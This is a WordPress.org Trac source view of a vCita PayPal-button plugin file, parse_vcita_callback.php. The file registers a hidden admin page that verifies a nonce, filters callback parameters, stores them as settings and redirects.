* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/paypal-payment-button-by-vcita/trunk/system/parse_vcita_callback.php?rev=2924423 "Revision 2924423")
* Next Revision →
* [Blame](/browser/paypal-payment-button-by-vcita/trunk/system/parse_vcita_callback.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/paypal-payment-button-by-vcita/trunk/system/parse_vcita_callback.php)

---

# [source:](/browser?order=name "Go to repository root") [paypal-payment-button-by-vcita](/browser/paypal-payment-button-by-vcita?order=name "View paypal-payment-button-by-vcita")/[trunk](/browser/paypal-payment-button-by-vcita/trunk?order=name "View trunk")/[system](/browser/paypal-payment-button-by-vcita/trunk/system?order=name "View system")/[parse\_vcita\_callback.php](/browser/paypal-payment-button-by-vcita/trunk/system/parse_vcita_callback.php?order=name "View parse_vcita_callback.php")

View diff against:

View revision:

| [Last change](/changeset/3215558/paypal-payment-button-by-vcita/trunk/system/parse_vcita_callback.php "View differences") on this file was [3215558](/changeset/3215558/ "View changeset 3215558"), checked in by vCita, [2 weeks ago](/timeline?from=2025-01-01T08%3A51%3A14Z&precision=second "See timeline at 01/01/2025 08:51:14 AM") |
| --- |
| security update |
| * Property **svn:executable** set to   *`*`* | |
| **File size:** 2.8 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | /\* |
| [3](#L3) | \*  livesite\_parse\_callback |
| [4](#L4) | \* |
| [5](#L5) | \*  @description: Parses the return callback once the user logged in to vCita |
| [6](#L6) | \*  @since: 3.6 |
| [7](#L7) | \*  @created: 25/01/13 |
| [8](#L8) | \*/ |
| [9](#L9) |  |
| [10](#L10) | class livesite\_parse\_callback |
| [11](#L11) | { |
| [12](#L12) |  |
| [13](#L13) | /\*\* |
| [14](#L14) | \* Sets up helpers as global |
| [15](#L15) | \* @since 0.1.1 |
| [16](#L16) | \*/ |
| [17](#L17) | public $ls\_helpers; |
| [18](#L18) |  |
| [19](#L19) | /\* |
| [20](#L20) | \*  \_\_construct |
| [21](#L21) | \* |
| [22](#L22) | \*  @description: |
| [23](#L23) | \*  @since 3.1.8 |
| [24](#L24) | \*  @created: 23/06/12 |
| [25](#L25) | \*/ |
| [26](#L26) |  |
| [27](#L27) | function \_\_construct(){ |
| [28](#L28) |  |
| [29](#L29) | $this->ls\_helpers = new ls\_helpers(); |
| [30](#L30) |  |
| [31](#L31) | // Uses priority 20 to laod after plugin init |
| [32](#L32) | add\_action( 'admin\_menu', array($this, 'add\_parse\_vcita\_callback\_page'), 20 ); |
| [33](#L33) |  |
| [34](#L34) | } |
| [35](#L35) |  |
| [36](#L36) | /\*\* |
| [37](#L37) | \* Adds a hidden page to allow reseting the plugin (mainly used for degbugging but not exclusive) |
| [38](#L38) | \* @since 0.1.0 |
| [39](#L39) | \*/ |
| [40](#L40) | function add\_parse\_vcita\_callback\_page(){ |
| [41](#L41) | add\_submenu\_page( |
| [42](#L42) | null, |
| [43](#L43) | \_\_('', 'livesite'), |
| [44](#L44) | \_\_('', 'livesite'), |
| [45](#L45) | 'edit\_posts', |
| [46](#L46) | 'live-site-parse-vcita-callback', |
| [47](#L47) | array($this, 'ls\_parse\_vcita\_callback') |
| [48](#L48) | ); |
| [49](#L49) | } |
| [50](#L50) |  |
| [51](#L51) | /\*\* |
| [52](#L52) | \* Parses the return values from vcita connection |
| [53](#L53) | \* @since 0.1.0 |
| [54](#L54) | \*/ |
| [55](#L55) | function ls\_parse\_vcita\_callback() { |
| [56](#L56) | // CSRF |
| [57](#L57) | if (!isset($\_GET['\_wpnonce']) || !wp\_verify\_nonce($\_GET['\_wpnonce'], 'vcita\_callback\_nonce')) { |
| [58](#L58) | wp\_die(\_\_('Invalid nonce verification', 'livesite')); |
| [59](#L59) | } |
| [60](#L60) |  |
| [61](#L61) | $success = filter\_var($\_GET['success'], FILTER\_VALIDATE\_BOOLEAN); |
| [62](#L62) | $uid = filter\_var($\_GET['uid'], FILTER\_SANITIZE\_STRING); |
| [63](#L63) | $first\_name = filter\_var($\_GET['first\_name'], FILTER\_SANITIZE\_STRING); |
| [64](#L64) | $last\_name = filter\_var($\_GET['last\_name'], FILTER\_SANITIZE\_STRING); |
| [65](#L65) | $title = filter\_var($\_GET['title'], FILTER\_SANITIZE\_STRING); |
| [66](#L66) | $confirmation\_token = filter\_var($\_GET['confirmation\_token'], FILTER\_SANITIZE\_STRING); |
| [67](#L67) | $confirmed = filter\_var($\_GET['confirmed'], FILTER\_VALIDATE\_BOOLEAN); |
| [68](#L68) | $engage\_delay = filter\_var($\_GET['engage\_delay'], FILTER\_SANITIZE\_STRING); |
| [69](#L69) | $implementation\_key = filter\_var($\_GET['implementation\_key'], FILTER\_SANITIZE\_STRING); |
| [70](#L70) | $email = filter\_var($\_GET['email'], FILTER\_VALIDATE\_EMAIL); |
| [71](#L71) |  |
| [72](#L72) | ls\_set\_settings(array( |
| [73](#L73) | 'vcita\_connected' => true, |
| [74](#L74) | 'vcita\_params' => array( |
| [75](#L75) | 'success'              => $success, |
| [76](#L76) | 'uid'                  => $uid, |
| [77](#L77) | 'first\_name'           => $first\_name, |
| [78](#L78) | 'last\_name'            => $last\_name, |
| [79](#L79) | 'title'                => $title, |
| [80](#L80) | 'confirmation\_token'   => $confirmation\_token, |
| [81](#L81) | 'confirmed'            => $confirmed, |
| [82](#L82) | 'engage\_delay'         => $engage\_delay, |
| [83](#L83) | 'implementation\_key'   => $implementation\_key, |
| [84](#L84) | 'email'                => $email |
| [85](#L85) | ) |
| [86](#L86) | )); |
| [87](#L87) |  |
| [88](#L88) | $ls\_helpers = $this->ls\_helpers; |
| [89](#L89) |  |
| [90](#L90) | $redirect\_url = $ls\_helpers->get\_plugin\_path(); |
| [91](#L91) | ?> |
| [92](#L92) | <script type="text/javascript"> |
| [93](#L93) | window.location = "<?php echo esc\_url($redirect\_url); ?>"; |
| [94](#L94) | </script> |
| [95](#L95) | <?php |
| [96](#L96) | } |
| [97](#L97) |  |
| [98](#L98) |  |
| [99](#L99) | } |
| [100](#L100) |  |
| [101](#L101) | new livesite\_parse\_callback(); |
| [102](#L102) |  |
| [103](#L103) | ?> |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/paypal-payment-button-by-vcita/trunk/system/parse_vcita_callback.php?format=txt)
* [Original Format](/export/3222718/paypal-payment-button-by-vcita/trunk/system/parse_vcita_callback.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


